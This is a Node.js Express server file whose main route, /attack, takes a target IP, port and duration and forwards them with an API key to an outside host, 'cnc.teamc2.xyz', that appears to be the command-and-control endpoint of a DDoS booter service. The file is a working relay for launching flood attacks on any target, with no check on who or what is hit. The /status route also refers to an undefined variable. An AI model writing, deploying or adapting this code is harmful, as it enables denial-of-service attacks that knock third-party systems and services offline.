// file: server.js

require("dotenv").config();

const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();

// ================= MIDDLEWARE =================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ================= ENV =================
const API_KEY = process.env.API_KEY;
const PORT = process.env.PORT || 8080;

console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");
console.log("PORT:", PORT);

// ================= GLOBAL ERROR HANDLERS =================
process.on("uncaughtException", (err) => {
  console.error("UNCAUGHT ERROR:", err);
});

process.on("unhandledRejection", (err) => {
  console.error("UNHANDLED PROMISE:", err);
});

// ================= HEALTH ROUTES =================
app.get("/", (req, res) => {
  return res.status(200).send("🚀 API Running");
});

app.get("/health", (req, res) => {
  return res.status(200).json({
    status: true,
    msg: "Server healthy"
  });
});

app.get("/test", (req, res) => {
  return res.json({
    success: true,
    msg: "Test OK"
  });
});

// ================= STATUS ROUTE =================
app.get("/status", async (req, res) => {
  try {

    if (!STATUS_API) {
      return res.status(500).json({
        success: false,
        error: "STATUS_API missing"
      });
    }

    const response = await axios.get(
      STATUS_API,
      {
        timeout: 10000
      }
    );

     console.log("STATUS RESPONSE:", response.data);

    return res.json({
      success: true,
      data: response.data
    });

  } catch (err) {

    console.error(
      "STATUS ERROR:",
      err?.response?.data || err.message
    );

    return res.status(500).json({
      success: false,
      error:
        err?.response?.data ||
        err.message ||
        "Failed to fetch status"
    });
  }
});


// ================= ATTACK API =================
app.post("/attack", async (req, res) => {
  try {

    let { ip, port, time } = req.body;

    // ================= VALIDATION =================

    if (!ip || !port || !time) {
      return res.status(400).json({
        success: false,
        error: "Missing params"
      });
    }

    port = Number(port);
    time = Number(time);

    if (isNaN(port) || isNaN(time)) {
      return res.status(400).json({
        success: false,
        error: "Invalid port/time"
      });
    }

    if (!API_KEY) {
      return res.status(500).json({
        success: false,
        error: "API_KEY missing"
      });
    }

    // ================= TARGET API =================

    const url =
      `http://cnc.teamc2.xyz:5001/api/attack` +
      `?api_key=${API_KEY}` +
      `&target=${ip}` +
      `&port=${port}` +
      `&time=${time}` +
      `&concurrent=1`;

    console.log("REQUEST URL:", url);

    // ================= REQUEST =================

    const response = await axios.get(url, {
      timeout: 15000
    });

    // ================= RESPONSE =================

    return res.json({
      success: true,
      result: response.data
    });

  } catch (err) {

    console.error(
      "ATTACK ERROR:",
      err?.response?.data || err.message
    );

    return res.status(500).json({
      success: false,
      error: err?.response?.data || err.message || "Server error"
    });
  }
});

// ================= 404 HANDLER =================
app.use((req, res) => {
  return res.status(404).json({
    success: false,
    error: "Route not found"
  });
});

// ================= START SERVER =================
const server = app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server running on port ${PORT}`);
});

// ================= GRACEFUL SHUTDOWN =================
process.on("SIGTERM", () => {
  console.log("SIGTERM received. Shutting down...");

  server.close(() => {
    console.log("Server closed");
    process.exit(0);
  });
});
